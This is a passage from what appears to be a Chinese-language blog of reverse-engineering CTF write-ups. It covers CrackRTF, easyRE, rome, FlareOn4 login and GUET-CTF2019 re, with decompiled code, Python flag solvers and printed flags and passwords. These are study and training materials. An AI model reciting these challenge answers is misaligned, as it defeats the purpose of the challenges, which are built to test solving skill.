class="built_in">print</span>(flag+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>直接md5百度爆破花钱解决的事情，之前有人花钱过了，直接拿就行了非预期解免费网站（<a href="https://www.somd5.com/%EF%BC%89">https://www.somd5.com/）</a></p>
<p>第二个md5=~!3a@0123321@DBApp</p>
<p>第一次密码123321</p>
<p>第二次密码~!3a@0</p>
<p>之后会生成dbapp.rtf</p>
<p>直接找这个文件</p>
<p>Flag{N0_M0re_Free_Bugs}</p>
<h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>一道非常好的题目，题目不难，却胜在人性的弱点，说实话我一打开搜索字符串看见base64加密人就来劲了，</p>
<p>以为只要10次base64就能得到flag笑死，结果进坑了，得到看雪的一篇文章。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v19[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v20[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  __m128i v24[<span class="number">4</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v26; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v26 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v18, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v18[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v19, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v19[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v20, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v20));</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0</span>, v21, <span class="number">0x25</span>uLL);</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v3) = sub_424BA0((<span class="keyword">const</span> __m128i *)v21);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v5) = sub_424BA0((<span class="keyword">const</span> __m128i *)v21);</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v21[i] ^ i) != v18[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="keyword">sizeof</span>(v24));</span><br><span class="line">    v25 = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0</span>, (<span class="keyword">char</span> *)v24, <span class="number">0x40</span>uLL);</span><br><span class="line">    v24[<span class="number">2</span>].m128i_i8[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    LODWORD(v6) = sub_424BA0(v24);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = base64((__int64)v24);</span><br><span class="line">      v9 = base64(v8);</span><br><span class="line">      v10 = base64(v9);</span><br><span class="line">      v11 = base64(v10);</span><br><span class="line">      v12 = base64(v11);</span><br><span class="line">      v13 = base64(v12);</span><br><span class="line">      v14 = base64(v13);</span><br><span class="line">      v15 = base64(v14);</span><br><span class="line">      v16 = base64(v15);</span><br><span class="line">      v17 = base64(v16);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v17, (__int64)off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v26 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是真正打比赛，成百上千函数无异于大海捞针，但是我们现在在练习的角度冷静思考，这是比赛的东西，那么就不会变态的为难</p>
<p>做题的人，我们可以根据人性的心理在主函数的上下函数去查找。结果发现main函数的下面是存在一个加密函数的。</p>
<p>先进行了判断输入的第一个字符和第四个字符是不是f，g，那么我们继续玩心理战，他判断的范围在1-4，常规flag开头就是flag</p>
<p>所以我们可以判断这个四个字符绝对就是flag，下面他就会对byte_6CC0A0中的字符进行异或操作加密</p>
<p>异或加密操作用到的密码我们可以根据</p>
<p>v1 ^ byte_6CC0A0[0]) == ‘f’ </p>
<p>这段代码推测得知是明文的前4个字符与’flag’进行异或得到的结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">jiami</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = sub_43FD20(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="string">&#x27;f&#x27;</span> &amp;&amp; (HIBYTE(v4) ^ (<span class="keyword">unsigned</span> __int8)byte_6CC0A3) == <span class="string">&#x27;g&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((<span class="keyword">unsigned</span> __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line">s1 = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key += <span class="built_in">chr</span>(s[i] ^ <span class="built_in">ord</span>(s1[i]))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i] ^ <span class="built_in">ord</span>(key[i % <span class="number">4</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>main</p>
<p>ida7.5==-==打死我也不想用了</p>
<p>可以看见给了密文 strcpy(v12, “Qsw3sj_lz4_Ujw@l”);记得转成ASCII</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="keyword">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="keyword">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="keyword">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点判断如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="string">&#x27;Z&#x27;</span> )<span class="comment">//判断大写</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; *((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="string">&#x27;z&#x27;</span> )<span class="comment">//判断小写</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="keyword">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>

<p>这个都不算逆向的感觉。。。直接顺势思维把这段代码抄下来，因为数组是17下标是0-16，然后ASCII一共就128个</p>
<p>直接脚本一把梭</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">x = [<span class="number">81</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">51</span>,<span class="number">115</span>,<span class="number">106</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">122</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">64</span>,<span class="number">108</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):  <span class="comment">#ASCII到目前为止共定义了128个字符，挨个儿试</span></span><br><span class="line">        z = i</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">64</span> <span class="keyword">and</span> i &lt;= <span class="number">90</span>:</span><br><span class="line">            i = (i-<span class="number">51</span>)%<span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">96</span> <span class="keyword">and</span> i &lt;= <span class="number">122</span>:</span><br><span class="line">            i = (i-<span class="number">79</span>)%<span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span>(i == x[k]):</span><br><span class="line">            flag += <span class="built_in">chr</span>(z)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h2><p>网页源代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c &lt;= “Z” ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);});</p>
<p>重点在这，首先进行了字母大小写的判断c &lt;= “Z” ? 90 : 122</p>
<p>其次对属于字母范围内的数据，进行加13，看大于不大于当前的Z（所谓当前的Z是因为第一步进行了大小写的判断，大写对于大Z，小写对应小z）</p>
<p>如果小于就保持不动，大于就减去26，相当于对明文进行了减去13</p>
<p>我们逆向的思维就是，判断大小写，给他-13看他小于当前的A不，小于就+13，不然就+13，不在字母范围内的就不管</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">code = <span class="string">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt;=<span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;=<span class="number">90</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">65</span>:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;=<span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;=<span class="number">122</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">97</span>:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag+=i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h2><p>无聊题，放到现在就是真无聊，直接UPX3.6一键脱壳，接着看见加密密钥就是乘上明文对比加密后的密文是否相等</p>
<p>除以就行了，然后这里没有a[6]直接爆破就行了</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="built_in">chr</span>(<span class="number">166163712</span> // <span class="number">1629056</span>)</span><br><span class="line">a2 = <span class="built_in">chr</span>(<span class="number">731332800</span> // <span class="number">6771600</span>)</span><br><span class="line">a3 = <span class="built_in">chr</span>(<span class="number">357245568</span> // <span class="number">3682944</span>)</span><br><span class="line">a4 = <span class="built_in">chr</span>(<span class="number">1074393000</span> // <span class="number">10431000</span>)</span><br><span class="line">a5 = <span class="built_in">chr</span>(<span class="number">489211344</span> // <span class="number">3977328</span>)</span><br><span class="line">a6 = <span class="built_in">chr</span>(<span class="number">518971936</span> // <span class="number">5138336</span>)</span><br><span class="line">a8 = <span class="built_in">chr</span>(<span class="number">406741500</span> // <span class="number">7532250</span>)</span><br><span class="line">a9 = <span class="built_in">chr</span>(<span class="number">294236496</span> // <span class="number">5551632</span>)</span><br><span class="line">a10 = <span class="built_in">chr</span>(<span class="number">177305856</span> // <span class="number">3409728</span>)</span><br><span class="line">a11 = <span class="built_in">chr</span>(<span class="number">650683500</span> // <span class="number">13013670</span>)</span><br><span class="line">a12 = <span class="built_in">chr</span>(<span class="number">298351053</span> // <span class="number">6088797</span>)</span><br><span class="line">a13 = <span class="built_in">chr</span>(<span class="number">386348487</span> // <span class="number">7884663</span>)</span><br><span class="line">a14 = <span class="built_in">chr</span>(<span class="number">438258597</span> // <span 